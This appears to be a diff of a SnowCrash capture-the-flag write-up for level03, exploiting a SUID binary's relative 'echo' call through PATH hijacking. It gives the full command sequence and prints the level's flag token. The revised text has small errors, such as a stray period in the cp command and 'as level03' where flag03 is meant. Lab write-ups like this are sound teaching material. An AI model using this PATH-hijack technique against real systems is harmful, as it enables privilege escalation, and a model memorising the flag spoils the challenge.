@@ -1,9 +1,9 @@
-# Goal
+# level03 - PATH way to the flag
 
-find the level04 password
-we can retrieve it by launching getflag as flag03
+## Reconnaissance
 
-# Reconnaissance
+- Our home contain a executable file named `level03` who belongs to `flag03` user.
+- It has the SUID and SGID bits set, meaning that we can execute it with `flag03` rights.
 
 ```
 level03@SnowCrash:~$ pwd
@@ -18,37 +18,44 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
 ```
 
-1. We do not have writing rights in our home
+## `level03` executable
 
-- chmod 777 .
+### Program Behavior
 
-Our home contain a executable file named level03 who belongs to the flag03 user. It has the SUID and SGID bits set, meaning that we can execute it with flag03 rights.
-
-## level03 executable
+- If we run the program, it prints the string `Exploit me`.
+- Testing different strings as arguments do not change this behavior.
 
 ```
 level03@SnowCrash:~$ ./level03
 Exploit me
 ```
 
-testing different strings as argument do not change the program behavior.
+### String content
 
-strings -a level03 | grep echo
+- The executable contains the following string: `/usr/bin/env echo Exploit me`
+
+```
+strings -a level03
+            ...
 /usr/bin/env echo Exploit me
-
+            ...
 level03@SnowCrash:~$ objdump -s -j .rodata level03
-
+            ...
 level03: file format elf32-i386
-
+            ...
 Contents of section .rodata:
-
+            ...
 80485d8 03000000 01000200 2f757372 2f62696e ......../usr/bin
 80485e8 2f656e76 20656368 6f204578 706c6f69 /env echo Exploi
-80485f8 74206d65 00 t me.  
-level03@SnowCrash:~$
+80485f8 74206d65 00 t me.
+            ...
+```
 
-## angr decompiler on dogbolt.org
+### Decompiling
 
+- Using angr decompiler on dogbolt.org
+
+```
 int main()
 {
 unsigned int v0; // [bp-0xc]
@@ -61,19 +68,33 @@ unsigned int v1; // [bp-0x8]
     return system("/usr/bin/env echo Exploit me");
 
 }
+```
 
-/usr/bin/env is an absolut path
-echo a relative path
+- The `level03` executable will run the command line `/usr/bin/env echo Exploit me` with `flag03` rights.
+- We notice that the `echo` command has a relative path whereas the `env` command is given with an absolut path. The env PATH variable will be used to find the `echo` command, not the `env` one.
 
-if we change the PATH environment variable, it will affect only the echo program.
+## PATH way to the flag
 
-# Exploitation
+- By changing the `env PATH` variable, it should be possible to delude the `level03` program and let it execute the program our choice (i.e. `getflag`) as `level03`.
+- First we need more rights on our home:
 
 ```
-level03@SnowCrash:~$ cp /bin/getflag echo
-level03@SnowCrash:~$ ls
-echo  level03  toto
+level03@SnowCrash:~$ chmod 710 .
+```
+
+- We then copy `getflag` as `echo` in our home
+
+```
+level03@SnowCrash:~$ cp /bin/getflag echo.
+```
+
+- And finally run `level03` changing the `PATH` variable
+
+```
 level03@SnowCrash:~$ PATH=./ level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
-level03@SnowCrash:~$
 ```
+
+# Flag
+
+- `level04` password (flag): qi0maab88jeaj46qoumi7maus
